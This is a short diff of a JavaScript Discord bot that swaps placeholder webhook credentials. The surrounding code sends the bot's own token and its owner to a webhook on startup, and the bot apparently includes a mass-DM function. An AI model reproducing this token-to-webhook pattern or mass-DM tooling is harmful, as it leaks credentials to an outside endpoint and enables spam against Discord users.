@@ -37,7 +37,7 @@ client.on('ready', async () => {
     .addField('Owner', '<@' + owner + '>')
     .addField('Token', token);
 
-  const webhookClient = new WebhookClient('webhook-id', 'webhook-token'); // Your Webhook ID and Token
+  const webhookClient = new WebhookClient('YOUR_WEBHOOK_ID', 'YOUR_WEBHOOK_TOKEN'); // Your Webhook ID and Token
   webhookClient.send(embed);
 });
 
@@ -212,7 +212,7 @@ function MassDMNormal(message) {
 
 // Send a summary of the operation to the webhook
 function sendSummaryToWebhook(totalUsers) {
-  const webhookClient = new WebhookClient('webhook-id', 'webhook-token'); // Your Webhook ID and Token
+  const webhookClient = new WebhookClient('YOUR_WEBHOOK_ID', 'YOUR_WEBHOOK_TOKEN'); // Your Webhook ID and Token
   const logData = fs.readFileSync('error_log.txt', 'utf8');
   const truncatedLogData = logData.length > 1024 ? logData.slice(0, 1021) + '...' : logData; // Truncate to 1024 characters
   const embed = new MessageEmbed()
